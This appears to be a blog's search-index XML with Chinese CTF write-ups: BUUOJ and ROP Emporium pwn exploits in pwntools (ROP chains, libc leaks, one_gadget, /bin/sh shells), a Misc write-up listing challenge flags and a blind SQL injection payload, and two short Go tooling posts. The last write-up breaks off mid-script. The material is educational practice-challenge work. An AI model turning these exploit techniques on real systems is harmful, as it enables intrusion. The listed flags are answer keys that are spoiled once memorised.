<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【CTF-PWN】ROP + One_gadget拿shell]]></title>
    <url>%2F2020%2F06%2F20%2F18-buuoj-babyrop2%2F</url>
    <content type="text"><![CDATA[记录一下在题目中one_gadget的使用, one_gadget永远滴神. 0x01 题目地址https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2 0x02 开始梭哈题目给了一个babyrop2和一个libc.so.6, 先分析一下这个babyrop2. babyrop2程序就一个输入点 打算使用printf函数泄露出__libc_start_main的地址. (确实没有找到合适泄露的函数, 只能这个了…) 也就是要构造一个printf(&quot;%s&quot;, __libc_start_main的got地址)先找到%s 截取到%s开始, 也就是 __libc_start_main的got就不用多说了. 接下来从libc.so.6里面得到一些信息 libc.so.6我们要从这个文件中得到one_gadget, 需要借助一个工具, 就叫one_gadget. one_gadget是什么呢? 就是我们以往做ROP需要泄露地址然后拿到真实的system函数以及bin_sh字符串的地址构造ROP, 但是当有了one_gadget, 就可以直接返回到这个地址拿到shell. 0x03 expfrom pwn import * p = process("./babyrop2") # p = remote("node3.buuoj.cn", 29305) elf = ELF("./babyrop2") libc = elf.libc # var overflow = 0x20 + 8 format_string = 0x400790 pop_rdi = 0x0000000000400733 pop_rsi_r15 = 0x0000000000400731 printf_plt = elf.plt["printf"] libc_start_main_got = elf.got["__libc_start_main"] main_addr = elf.sym["main"] payload = "A" * overflow payload += p64(pop_rdi) + p64(format_string) payload += p64(pop_rsi_r15) + p64(libc_start_main_got) + p64(0) payload += p64(printf_plt) + p64(main_addr) p.sendline(payload) leak_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\0")) success("libc_start_main: {}".format(hex(leak_addr))) libc_base = leak_addr - libc.sym["__libc_start_main"] payload = "A" * overflow payload += p64(libc_base + 0x45216) p.sendline(payload) p.interactive() emm, 这题目flag竟然没放到根目录, 还要找一下才可以QAQ flag{23d424ad-f38b-4a47-a60f-41ca5c19fb88}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUOJ CTF Misc题目WriteUP]]></title>
    <url>%2F2020%2F06%2F03%2F17-buuoj-misc-writeup%2F</url>
    <content type="text"><![CDATA[BUUOJ CTF, 日常刷题记录, 包含题目flag, 以及使用的脚本. 这是关于杂项题目的WP, 之前写过密码学的WP, 如果有需要可以转到BUUCTF 密码学思路 签到emm, 直接给flag了。flag{buu_ctf} 金三胖是一个gif, 可以通过网站分解, 也可以自己写个脚本. import os from PIL import Image if "images" not in os.listdir(): os.mkdir("images") img = Image.open("aaa.gif") for i in range(200): try: img.seek(i) img.save(f"images/{i}.png") except EOFError: break flag{he11ohongke} 二维码打开之后扫描, 结果是secret is here, 并没啥用处.扔进binwalk直接分离, 得到了一个有密码的压缩包, 压缩包内的文件名叫4number.txt, 也就是密码是长度为4的纯数字！ 直接开始爆破.得到密码7639flag{vjpw_wnoei} N种方法解决下载下来是个.exe的windows可执行文件, 但是双击并不能运行, 使用notepad++打开发现是Data URI scheme, 直接本地建一个.html文件 &lt;img src="data:......"> 然后双击打开就可以看到一个二维码, 扫描就可得到flag.flag{dca57f966e4e4e31fd5b15417da63269} 大白打开图片看到大白的下半身不见了, 图片格式是png, 通过题目的提示看不到图？ 是不是屏幕太小了, 基本可以判断是通过修改高度来显示出来大白的下半身得到flag.将原本的01 00改成04 00, 即可显示出下半身.flag{He1l0_d4_ba1} 基础破解题目提到了是四位数字加密, 直接爆破.密码是: 2563, 解开之后是个base64, 解码一下就可以.flag{70354300a5100ba78068805661b93a5c} 你竟然赶我走一个图片, 使用notepad++打开, 按ctrl + end直接跳转到最后一行, 可以看到flagflag{stego_is_s0_bor1ing} 乌镇峰会种图和头上一道题一样的操作步骤.flag{97314e7864a8f62627b26f3f998c37f1} LSB看到LSB, 我直接开启了Stegsolve.jar可以看到最低位隐写了一个PNG文件, savebin下来. 看到是一个二维码, 扫码得到flagflag{1sb_i4_s0_Ea4y} rar题目提示是rar的密码是4位纯数字, 爆破得到密码8795, 解压得到flagflag{1773c5da790bd3caff38e3decd180eb7} qr得到一个二维码, 扫码直接得到flagflag{878865ce73370a4ce607d21ca01b5e59} 文件中的秘密图片右键属性就可以看到flagflag{870c5a72806115cb5439345d8b014396} wireshark题目提示是登陆网站的一段流量包, 那么直接打开wireshark过滤出http协议.flag{ffb7567a1d4f4abdffdb54e022f8facd} ningen通过notepad++看到最后有类似ningen.txt, 扔进binwalk分离出了一个zip文件, 文件有密码, 通过题目提示知道了秋明特别讨厌中国的六位银行密码，喜欢四位数。那就是四位的纯数字, 爆破就好了, 得到密码8368, 解压得到flagflag{b025fc9ca797a67d2103bfbc407a6d5f} zip伪加密使用winHex打开, 修改09 00为00 00, 再次进行解压, 得到flagflag{Adm1N-B2G-kU-SZIP} 镜子里面的世界一开始没分析出来, 看了看图片名… steg? stegsolve????? 哦?… 使用Stegsolve.jar打开.哦. 还真是啊, 那没事了.flag{st3g0_saurus_wr3cks} 小明的保险箱其实就是套娃题目, binwalk分离出压缩包, 爆破出4位数字, 得到flag压缩包密码7869flag{75a3d68bf071ee188c418ea6cf0bb043} 被嗅探的流量wireshark, tcp.stream eq 2, 追踪tcp流, 即可找到flagflag{da73d88936010da1eeeb36e945ec4b97} 爱因斯坦得到图片, 右键查看属性, 得到一条this_is_not_passwordbinwalk分离出了一个压缩包, 有密码, 不知道密码怎么办呢? 那就试试上面这条吧.压缩包密码: this_is_not_password, 解压缩得到flag, sb题目.flag{dd22a92bf2cceb6c0cd0d6b83ff51606} easycap是个流量包, wireshark打开直接追踪tcp流, ….嗯..直接就是flagflag{385b87afc8671dee07550290d16a8071} 假如给我三天光明给了一个带有密码的压缩包和一张图片, 图片下面是盲文, 直接从网上找个图片挨个对照, 得到压缩包密码kmdonowg解压得到一个音频文件, 听声音是摩斯电码, 通过Audacity可以看到音频长短, 然后去解密, 得到flagflag{wpei08732?23dz} FLAG通过StegSolve.jar得到了一个zipsavebin后, 解压, 得到一个elf文件, 直接通过notepad++搜索ctf关键字, 就可以看到flagflag{dd0gf4c3tok3yb0ard4g41n~~~} 另外一个世界一张图片, 通过notepad++打开之后, 最后有一段神秘的二进制01101011011011110110010101101011011010100011001101110011, 把二进制转化为字符串, 得到flagflag{koekj3s} 隐藏的钥匙通过notepad++打开, 搜索flagbas64解码得到flagflag{377cbadda1eca2f2f73d36277781f00a} 荷兰宽带数据泄露工具 + 猜谜题目, 没工具就做不出来, 工具名: RouterPassView没错, 用户名就是flagflag{053700357621} [BJDCTF 2nd]最简单的misc-y1ngnotepad++打开, 发现了一段16进制字符串424A447B79316E677A756973687561697D HEX转ASCII, 得到flagflag{y1ngzuishuai} 后门查杀直接D盾扫描, 木马文件在/include/include.php, 得到flagflag{6ac45fb83b3bc355c024f5034b947dd3} [BJDCTF 2nd]A_Beautiful_Picturepng文件, 修改图片高度, 得到flagflag{Png_He1ghT_1s_WR0ng} 来首歌吧没错, 是首歌, 一开始左声道没声音, 音乐到中间的时候, 左声道响起了摩斯电码…使用Audacity进行分析即可得到摩斯, 解码摩斯得到flag (flag要大写)flag{5BC925649CB0188F52E617D70929191C} 神秘龙卷风根据题目提示, 4位数字, 先爆破, 密码为5463, 解压看到了BrainFuck, 在线转码flag{e4bbef8bdf9743f8bf5b727a9f6332a8} 九连环binwalk得到了一个图片和压缩包, 压缩包有密码, 只能从图片入手了, 这里要用到一个工具stgehide, 从图片提取出了一个txt, 内容是.. 看到这个图片就是压缩包的密码： bV1g6t5wZDJif^J7 解压, 得到flagflag{1RTo8w@&amp;4nK@z*XL} [BJDCTF 2nd]小姐姐-y1ng通过notepad++的正则匹配搜索{(.*?)}, 找到了flagflag{haokanma_xjj} snake通过binwalk分离出了一个cipher和keykey: 是一个base64, 解码得到What is Nicki Minaj&#39;s favorite song that refers to snakes? 答案是…anacondacipher: 需要使用在线工具flag{who_knew_serpent_cipher_existed} 面具下的flag通过binwalk得到了一个flag.vmdk, emm? 虚拟机文件? 直接通过7zip解压开, 得到了一段brainfuck, 解码得flag{N7F5_AD5, 还少了一半…另一半通过 strings flag.vmdk 找到了一堆ook,解码得到_i5_funny!}, so? 拼接得到最后的flagflag{N7F5_AD5_i5_funny!} webshell后门D盾直接扫描, 后门文件是/member/zp.php.flag{ba8e6c6f35a53933b871480bb9a9545c} 梅花香之苦寒来通过notepad++打开图片, 翻着翻着看到一堆hex, 复制一小部分拿去解码, 发现是类似与坐标的东西. 直接自己写个脚本搞出来. from PIL import Image # 通过坐标的最大值数字 + 1计算出来的. width = 272 height = 272 img = Image.new("RGB", (width, height), "white") # cipher文件就是那一堆hex with open("cipher", "r") as fp: data = fp.read() temp = "" for i in range(0, len(data), 2): strHex = "0x" + data[i:i+2] decResult = int(strHex, 16) item = chr(decResult) if decResult == 10: print(temp) x = temp.replace("(", "").replace(")", "").split(",")[0] y = temp.replace("(", "").replace(")", "").split(",")[1] img.putpixel((int(x),int(y)), (0,0,0)) temp = "" else: temp += item img.show() 执行完毕后生成了一个二维码 得到flagflag{40fc0a979f759c8892f4dc045e28b820} 数据包中的线索wireshark打开看到了一个fenxi.php的包, 很多base64, 直接Base64 To Image即可看到flagflag{209acebf6324a09671abc31c869de72c} 刷新过的图片根据题目, 刷新 F5, 一定是F5隐写, 直接使用工具(F5-steganography-james)就可以解出一个zip文件, 然后直接解压得到flagflag{96efd0a2037d06f34199e921079778ee} 被劫持的神秘礼物直接FOLLOW TCP STREAMflag就是adminaadminb的小写md5 flag{1d240aafe21a86afc11f38a45b541a49} [BJDCTF 2nd]EasyBaBa文件很大, 绝对不一般, 扔进binwalk, 看到一个zip, 使用dd命令手动分割出来 dd if=ezbb.jpg of=2.zip bs=1 skip=28227 解压出来发现是一个.jpg, 但是大小很可以, 使用file命令查看是.avi的视频文件, 于是改后缀 就可以播放了. 视频看着看会闪过几张图片, 图片上有二维码, 用PR一帧一帧分析 + 扫描就可以了.flag{imagin_love_Y1ng} 菜刀666wireshark分析可以找到菜刀连接的痕迹, 我这里是使用的foremost工具提取出来的压缩包.拿到压缩包之后发现有密码, 于是又返回wireshark, 从wireshark找到了一堆16进制 可以看到是z2参数的, 开头是FFD8FF, 有经验的就可以看出是.jpg文件的头, 于是拿出来, 保存到文件, 使用xxd命令将其保存成图片. 这里保存成1 xxd -r -p 1 > 1.jpg 图片上就是压缩包的密码, 然后解压压缩包, 得到flagflag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z} [BJDCTF 2nd]Real_EasyBaBa使用winhex打开, 发现有一个地方不太对劲…这里我的屏幕是60Hz的, 上下滚动会有一点点拖影, 如果你也是, 不妨也跟我一样上下滚动鼠标, 就可以隐隐约约看清楚…BJD{… 好, flag出来了.其实也可以根据这个画一下。 flag{572154976} [BJDCTF 2nd]圣火昭昭-y1ng图片右键属性查看到了信息新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如. 之前见过类似的, 但是这个是新佛曰, 没错, 更新换代了. 在线工具解出了gemlovecom, 根据题目说明, 去掉com, 得到flag…..? flag不对? 继续分析. 这里要用到outguess, 这个东西解密需要密钥, 所以我们刚才得到的gemlove.嗯..打个Misc都有茄子啊 wdnmd。flag{wdnmd_misc_1s_so_Fuck1ng_e@sy} 穿越时空的思念一段音频文件, 右声道有摩斯电码, 使用Audacity分析, 得到flagflag{f029bd6f551139eedeb8e45a175b0786} Mysterious真逆向题目, 使用IDA静态分析, 搜索字符串找到了well done, Buff3r_0v3rf|0w之类的字样, 追踪到使用这个字符串的函数中, 可以看到 首先是输入长度是6, v12会被+1, 要等于123, 也就是先写122, 后面120 122 121,也就是需要 v14 = 120 v15 = 121 v16 = 122 转换成ascii码, 正好是xyz, 那么加上之前的122, 长度也刚好吻合, 最后的payload也就是122xyz flag{123_Buff3r_0v3rf|0w} sqltest是一段sql盲注的包, 筛选出长度最长的包, 然后分析盲注语句. 1 and ascii(substr(((select concat_ws(chr(94), flag) from db_flag.tb_flag limit 0,1)), 1, 1)) > 101 此时需要一点sql基础, substr(&quot;test&quot;, 1,1)代表第一位开始取一位, 也就是取出t那么substr(&quot;test&quot;, 3, 1)也就是取出s ascii函数就是把取出来的内容转换成ascii码. 然后最后面的&gt; 101就是一段判断取出来的字母的ascii码是否是大于101. 那么就好办了, 直接按照这个规律挨个看也行. 因为是大于号, 所以每个字母位置的最后一个包后面的数字要 + 1, 例子上的这个是第一个字母的包, 所以第一个字母的ascii就是102, 转换成字符串也就是f. 得到所有的ascii, 并保存为1.txt 102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125 写个脚本给他转出来 with open("1.txt", "r") as fp: for i in fp.readlines(): print(chr(int(i.strip())), end="") flag{47edb8300ed5f9b28fc54b0d09ecdef7} [SWPU2019]神奇的二维码得到一个二维码, 扫码得到swpuctf{flag_is_not_here}, 看来不是这个. 于是notepad++打开文件, 发现最后藏了个good/good.mp3, 于是binwalk分解, 得到了一个flag.jpg…嗯..很嘲讽… 还得到了一个看看flag在不在里面^_^.rar和encode.txt, encode.txt里面是一段base64, 解出来的内容就是这个压缩包的密码, 里面的内容还是那个flag.jpg 也得到了一个flag.doc, 里面是一段很长的base64, 解码又得到了一个base64… 循环下去, 最终得到了一个.. comEON_YOuAreSOSoS0great, 这。。。也不像是flag啊… 嗯? 怎么回事? 怎么没有那个good.mp4, 于是看了看binwalk分解出来的其他压缩包, 发现了一个18394.rar, 有密码, 于是拿刚才解出的comEON_YOuAreSOSoS0great试了一下, 还真是… 得到了一段音频, 听声音是摩斯电码, 用Audacity分析出来, 拿去解码, 得到最终flagflag{morseisveryveryeasy} [GXYCTF2019]佛系青年下载下来压缩包, 解压的时候有个txt文件提示密码错误, 于是扔进WinHEX, 一看是伪加密.将09 00修改成00 00, 解压文件, 没有报错了, 打开txt文件之后发现是与佛论禅, 直接在线工具解密就可以了. flag{w0_fo_ci_Be1} 先写到这里吧，慢慢再补充辣。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>BUUCTF</tag>
        <tag>BUUOJ</tag>
        <tag>Misc</tag>
        <tag>WriteUP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件监听(FileWatch)实现原理]]></title>
    <url>%2F2020%2F06%2F01%2F16-Filewatch-base%2F</url>
    <content type="text"><![CDATA[拿上一篇文章中提到的dogo为例, 它是怎么进行文件监听的呢, 如何实现一个简单的文件监听 这篇文章就带你从底层看最简单的实现原理. 代码文件结构├─fileWatch │ ├─.idea │ └─folder │ main.go 原理把要监听的文件目录取 最后一次的更改时间 和 当前大小, 这两个值的类型都是int64, 然后进行异或, 这样无论是哪个值发生了更改, 最后的异或结果都会进行变化, 就可以看出这个目录是否被操作了. 代码实现main.go package main import ( "fmt" "os" "time" ) var ( FolderName = "C:\\Users\\Administrator\\Desktop\\fileWatch\\folder" LastValue int64 ) func main() { for { info, err := os.Stat(FolderName) if err != nil { panic("文件夹可能不存在.") } nowValue := info.ModTime().Unix() ^ info.Size() if nowValue != LastValue { fmt.Println("文件夹发生更改") LastValue = nowValue } time.Sleep(1 * time.Second) // 如果不Sleep, 会特别占用CPU } } 效果]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>FileWatch</tag>
        <tag>Base</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dogo目录监听自动构建工具]]></title>
    <url>%2F2020%2F05%2F31%2F15-golang-dogo-filelisten%2F</url>
    <content type="text"><![CDATA[dogo是一个使用Go语言编写的自动化构建工具, 可以实时监听目录, 发生更改时就自动执行特定命令。 Github: https://github.com/liudng/dogo 下载并编译git clone https://github.com/liudng/dogo.git cd dogo go mod init dogo go build 我使用的是windows系统, 执行完上面的命令之后会生成一个dogo.exe. 配置目前有个需求我的工作(源码)目录: C:\\Users\\Administrator\\Desktop\\testSource需要监听的文件类型: .go监听到更改需要执行的命令: go build -o main.exe并且build出来之后还要执行这个main.exe 配置文件就可以这样写: { "WorkingDir": "C:\\Users\\Administrator\\Desktop\\testSource", "SourceDir": [ "C:\\Users\\Administrator\\Desktop\\testSource" ], "SourceExt": [".go"], "BuildCmd": "go build -o main.exe", "RunCmd": "main.exe", "Decreasing": 1 } 看看效果?]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>watch</tag>
        <tag>dogo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF-PWN】ROPEmporium]]></title>
    <url>%2F2020%2F05%2F28%2F14-CTF-PWN-ROPEmporiumWriteUP%2F</url>
    <content type="text"><![CDATA[记录一下学习ROP的基础题目. ret2win 32位:先分析一下程序, 可以看到main、pwnme、ret2win函数.main函数调用了pwnme函数, pwnme函数里面存在一个gets读取0x32个字节到s变量里面, 但是这个变量只有0x28大小. 也就是0x28 + 4 + retaddr就可以控制这个程序的返回地址了. 废话不多说 直接上exp. from pwn import * p = process("./ret2win32") # var overflow = 0x28 + 4 ret2win_addr = 0x08048659 payload = "A" * overflow payload += p32(ret2win_addr) p.sendline(payload) p.interactive() 64位:虽然是64位的, 但是这个题目不需要进行rop, 所以和32位的做法一样. from pwn import * p = process("./ret2win") # var overflow = 0x20 + 8 # because is 64 bit program, +8 ret2win_addr = 0x0000000000400811 payload = "A" * overflow payload += p64(ret2win_addr) p.sendline(payload) p.interactive() split32位:main、pwnme函数都和上道题差不多, 但是usefulFunction里面只有一条system(&quot;/bin/ls&quot;), 并不是cat /flag, 不过可以通过IDA里面shift+F12, 搜索到/bin/cat flag.txt, 也就是system函数和/bin/cat flag.txt并不在连续的内存位置, 所以需要构造一下 :D 接下来就要用到汇编中, 调用函数的原理. 如果不懂的可以看我之前拍过的一期视频.【x86汇编】详解汇编调用函数三步，加恢复堆栈平衡 开始写exp from pwn import * p = process("./split32") elf = ELF("./split32") # var overflow = 0x28 + 4 system_addr = elf.plt["system"] cat_flag_addr = 0x0804A030 payload = "A" * overflow payload += p32(system_addr) + p32(0) payload += p32(cat_flag_addr) p.sendline(payload) p.interactive() 64位:64位调用函数参数寄存器: rdi, rsi, rdx, rcx, r8, r9从这里开始, 我们第一次接触gadget, 什么是gadget呢, 就是程序中存在的一些小汇编指令,比如pop rdi; ret, pop rsi; ret, mov r12, 13; ret, 有没有发现什么规律, 每个汇编指令结尾都是ret, 所以是ROP Return-Oriented Programming, 可以通过找到多个gadget, 最后组成一段长的链, 以完成我们的攻击. 在我们安装完毕pwntools之后, 会有一个工具ROPgadget, 它可以很方便的找到我们攻击所需要的gadget. 64位程序调用函数的时候, 函数的前6个参数是存在于寄存器当中的, 所以我们需要把/bin/cat flag.txt放到第一个参数的位置, 也就是需要找到pop rdi; ret 找pop rdi; ret ROPgadget --binary split --only "pop|ret" 可以找到0x0000000000400883 : pop rdi ; ret, 已经可以开始写exp了. from pwn import * p = process("./split") elf = ELF("./split") # var overflow = 0x20 + 8 pop_rdi_addr = 0x0000000000400883 cat_flag_addr = 0x0000000000601060 system_addr = elf.plt["system"] payload = "A" * overflow payload += p64(pop_rdi_addr) + p64(cat_flag_addr) payload += p64(system_addr) p.sendline(payload) p.interactive() callme32位:这道题目是为了加深函数调用的理解题目说需要依次调用callme_one(), callme_two() , callme_three()三个函数, 每个函数都需要传递1 2 3三个参数. 也就是func(1, 2, 3) 需要通过ROPgadget找到一个可以删除栈上三个参数的gadget, 以恢复栈平衡. 要注意, callme_one, callme_two等函数地址要取函数本身的, 而不是call callme_one之类的地址. 开始写exp from pwn import * p = process("./callme32") elf = ELF("./callme32") # var overflow = 0x28 + 4 callme_one_addr = elf.sym["callme_one"] callme_two_addr = elf.sym["callme_two"] callme_three_addr = elf.sym["callme_three"] pop_esi_rdi_rbp_ret = 0x080488a9 payload = "A" * overflow payload += p32(callme_one_addr) + p32(pop_esi_rdi_rbp_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_two_addr) + p32(pop_esi_rdi_rbp_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_three_addr) + p32(pop_esi_rdi_rbp_ret) + p32(1) + p32(2) + p32(3) p.sendline(payload) p.interactive() 64位:emm, 这个题目, 64位个人感觉要更简单一些, 专心找gadget就可以了. from pwn import * p = process("./callme") elf = ELF("./callme") # var overflow = 0x20 + 8 callme_one_addr = elf.sym["callme_one"] callme_two_addr = elf.sym["callme_two"] callme_three_addr = elf.sym["callme_three"] pop_rdi_rsi_rdx_addr = 0x0000000000401ab0 payload = "A" * overflow payload += p64(pop_rdi_rsi_rdx_addr) + p64(1) + p64(2) + p64(3) + p64(callme_one_addr) payload += p64(pop_rdi_rsi_rdx_addr) + p64(1) + p64(2) + p64(3) + p64(callme_two_addr) payload += p64(pop_rdi_rsi_rdx_addr) + p64(1) + p64(2) + p64(3) + p64(callme_three_addr) p.sendline(payload) p.interactive() write432位:这个挑战给了system但是没有给/bin/cat flag.txt, 则需要自己写一段进去, 这里打算直接写个/bin/sh, 但是往哪里写呢？ 通过readelf工具查看段. 可以看到.data和.bss段都有可读写的权限, 这里就可以把/bin/sh写到.data段内, 要写入的长度是7, data段大小是8, 刚好可以装下. 要想写入数据到里面, 需要使用mov指令, 于是找到了 0x080486da : pop edi ; pop ebp ; ret 0x08048670 : mov dword ptr [edi], ebp ; ret这两条指令就可以满足我们写入数据到内存的想法. 由于这是32位的程序, 每次只能写入4个字节, 而/bin/sh是7个字节, 于是我们要分两次进行写入。 那? Go? from pwn import * p = process("./write432") elf = ELF("./write432") # var overflow = 0x28 + 4 system_addr = elf.plt["system"] data_addr = 0x0804a028 pop_edi_ebp_addr = 0x080486da mov_edi_ebp = 0x08048670 bin_sh_str = "/bin/sh".ljust(8, "\0") left_bin_sh = bin_sh_str[:4] right_bin_sh = bin_sh_str[4:] payload = "A" * overflow payload += p32(pop_edi_ebp_addr) + p32(data_addr) + left_bin_sh + p32(mov_edi_ebp) payload += p32(pop_edi_ebp_addr) + p32(data_addr + 4) + right_bin_sh + p32(mov_edi_ebp) payload += p32(system_addr) + p32(0) payload += p32(data_addr) p.sendline(payload) p.interactive() 64位:思路和32位一样, 不过64位要更简单一些, 因为可以一次性直接把/bin/sh写进去, 不用分开写入了. 找到需要的gadget 0x0000000000400893 : pop rdi ; ret 0x0000000000400890 : pop r14 ; pop r15 ; ret 0x0000000000400820 : mov qword ptr [r14], r15 ; ret开始编写exp from pwn import * p = process("./write4") elf = ELF("./write4") # var overflow = 0x20 + 8 system_addr = elf.plt["system"] pop_rdi_addr = 0x0000000000400893 data_addr = 0x0000000000601050 mov_r14_r15_addr = 0x0000000000400820 pop_r14_15_addr = 0x0000000000400890 bin_sh_str = "/bin/sh".ljust(8, "\0") payload = "A" * overflow payload += p64(pop_r14_15_addr) + p64(data_addr) + bin_sh_str + p64(mov_r14_r15_addr) payload += p64(pop_rdi_addr) + p64(data_addr) payload += p64(system_addr) p.sendline(payload) p.interactive() badchars32位:程序禁止输入b i c / &lt;space&gt; f n s, 可以通过异或后的结果来把/bin/sh写到程序, 再通过gadget把/bin/sh异或回来, 再进行执行. 首先要得出异或哪个数字可以通过这个黑名单, 写个脚本跑跑. blackList = [ord(i) for i in ["b", "i", "c", "/", " ", "f", "n", "s"]] bin_sh = "/bin/sh".ljust(8, "\0") result = "" # 测试从1异或到20 看看哪个数字可以使用 for i in range(1, 20): for item in bin_sh: if ord(item) ^ i in blackList: break else: result += item if len(result) == 8: print(i) result = "" 执行完毕可以发现2 3 5 9 18 19之类的都可以用, 然后直接用个最小的就可以. 开始编写exp from pwn import * p = process("./badchars32") elf = ELF("./badchars32") overflow = cyclic_find("laaa") xor_num = 2 bin_sh = list("/bin/sh".ljust(8, "\0")) data_addr = 0x0804a038 system_addr = elf.sym["system"] mov_edi_esi_ret = 0x08048893 pop_esi_edi_ret = 0x08048899 pop_ebx_ecx_ret = 0x08048896 xor_ebx_ecx_ret = 0x08048890 # xor encode for index, item in enumerate(bin_sh): bin_sh[index] = chr(ord(item) ^ xor_num) bin_sh = "".join(bin_sh) payload = "A" * overflow # write "/bin" to data payload += p32(pop_esi_edi_ret) + bin_sh[:4] + p32(data_addr) payload += p32(mov_edi_esi_ret) # write "/sh" to data payload += p32(pop_esi_edi_ret) + bin_sh[4:] + p32(data_addr + 4) payload += p32(mov_edi_esi_ret) # decode xor for i in range(len(bin_sh)): payload += p32(pop_ebx_ecx_ret) + p32(data_addr + i) + p32(xor_num) payload += p32(xor_ebx_ecx_ret) # system(/bin/sh) payload += p32(system_addr) payload += p32(0) payload += p32(data_addr) p.sendline(payload) p.interactive() 64位:和32位一样思路, 只是找到gadget不一样, 还要注意要比32位程序多用一个pop rdi; ret. exp: from pwn import * p = process("./badchars") xor_num = 2 binsh = '/bin/sh\x00' xorbinsh = '' for i in binsh: a = ord(i) ^ xor_num xorbinsh += chr(a) overflow = cyclic_find("kaaa") pop_rdi_ret = 0x0000000000400b39 pop_r12_r13_ret = 0x0000000000400b3b mov_r13_r12_ret = 0x0000000000400b34 pop_r14_r15_ret = 0x0000000000400b40 xor_r15_r14_ret = 0x0000000000400b30 bss_addr = 0x601080 system_addr = 0x4006f0 payload = "A" * overflow payload += p64(pop_r12_r13_ret) + xorbinsh + p64(bss_addr) payload += p64(mov_r13_r12_ret) for i in range(len(xorbinsh)): payload += p64(pop_r14_r15_ret) payload += p64(xor_num) payload += p64(bss_addr + i) payload += p64(xor_r15_r14_ret) payload += p64(pop_rdi_ret) payload += p64(bss_addr) payload += p64(system_addr) p.sendline(payload) p.interactive() fluff32位:看介绍, 就是write4的升级版, 肯定是要找一条可以把寄存器的值写入到内存地址上的指令, 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret但是没找到pop ecx; pop edx; ret之类的操作 可是…可以发现一条 0x080485f3 : popal ; cld ; ret第一次遇到这个指令, 去搜了一下, 可以从栈上弹到所有寄存器,顺序是%edi-&gt;%esi-&gt;%ebp-&gt;%esp-&gt;%ebx-&gt;%edx-&gt;%ecx-&gt;%eax也就是相当于 pop edi; pop esi; pop ebp; pop esp; pop ebx; pop edx; pop ecx; pop eax;这样我们只需要随便填充其他的寄存器, 然后把ecx, edx寄存器填写成我们需要的内容就可以了. 为了减少代码量, 我们还可以写个函数. 直接上exp from pwn import * p = process("./fluff32") # var offset = 44 bss_addr = 0x0804a040 bin_sh = "/bin/sh".ljust(8, "\0") system_addr = 0x0804865A popal = 0x080485f3 # %edi->%esi->%ebp->%esp->%ebx->%edx->%ecx->%eax mov_ecx_edx = 0x08048693 # 2 mov [ecx], edx def write(text, offset): payload = p32(popal) payload += p32(0) payload += p32(0) payload += p32(0) payload += p32(0) payload += p32(0) payload += text # edx payload += p32(bss_addr + offset) # ecx payload += p32(0) payload += p32(mov_ecx_edx) + p32(0) + p32(0) return payload payload = "A" * offset payload += write(bin_sh[:4], 0) payload += write(bin_sh[4:], 4) payload += p32(system_addr) + p32(bss_addr) p.sendline(payload) p.interactive() 64位:只要搞明白, 0 与 正数进行异或, 得到的结果就是那个正数, 可以通过这个方法间接给一个寄存器赋值. from pwn import * p = process("./fluff") # var offset = 0x28 system_addr = 0x4005E0 bss_addr = 0x0000000000601060 pop_rdi = 0x00000000004008c3 # pop rdi; ret xor_r11_r11 = 0x0000000000400822 # xor r11, r11; pop; ? ret pop_r12 = 0x0000000000400832 # pop r12 ; ?; ret xor_r11_r12 = 0x000000000040082F # xor r11, r12; pop; ?; ret mov_r10_r11 = 0x000000000040084E # mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret xchg_r10_r11 = 0x0000000000400840 # xchg; pop; ?; ret bin_sh = "/bin/sh".ljust(8, "\0") # A == 0 -> A ^= ? -> A = ? """ >>> r11 = 100 >>> r11 ^= r11 >>> r11 0 >>> r12 = 200 >>> r11 ^= r12 >>> r11 200 """ payload = "A" * offset # bin/sh -> bss payload += p64(xor_r11_r11) + p64(0) # r11 = 0 payload += p64(pop_r12) + p64(bss_addr) # r12 = bss_addr payload += p64(xor_r11_r12) + p64(0) # r11 = r12 = bss_addr payload += p64(xchg_r10_r11) + p64(0) # r10 = 0 -> r10 = r11 = r12 = bss_addr payload += p64(xor_r11_r11) + p64(0) # r11 = 0 payload += p64(pop_r12) + bin_sh # r12 = /bin/sh payload += p64(xor_r11_r12) + p64(0) # r11 = 0 -> r11 = r12 = /bin/sh payload += p64(mov_r10_r11) + p64(0) + p64(0) # mov [bss], /bin/sh payload += p64(pop_rdi) + p64(bss_addr) # bss_addr = /bin/sh payload += p64(system_addr) # system(bss_addr) = system(/bin/sh) p.sendline(payload) p.interactive() pivot32位:分析一下题目, 有两个输入的地方,第一次输入会输入到堆中, 也就是程序打印那个地址.第二次输入就是要溢出了, 但是给我们构造ROP链的大小只有0xb. 肯定不够我们构造复杂的ROP链的, 所以我们要进行栈迁移. 题目给了libcpivot32.so, 分析了一下可以看到ret2win函数和foothold_function, 可以通过泄露foothold_function的地址计算出ret2win的实际地址并执行. from pwn import * import time p = process("./pivot32") elf = ELF("./pivot32") libc = ELF("libpivot32.so") # var overflow = 0x28 + 4 # 溢出字节 ret2win_sym = libc.sym["ret2win"] # 得到ret2win函数的地址 foothold_sym = libc.sym["foothold_function"] # 得到foothold_function offset = ret2win_sym - foothold_sym # 计算出foothold到ret2win函数的偏移 foothold_plt = elf.plt["foothold_function"] foothold_got = elf.got["foothold_function"] pop_eax = 0x080488c0 # pop eax; ret pop_ebx = 0x08048571 # pop ebx; ret mov_eax_eax = 0x080488c4 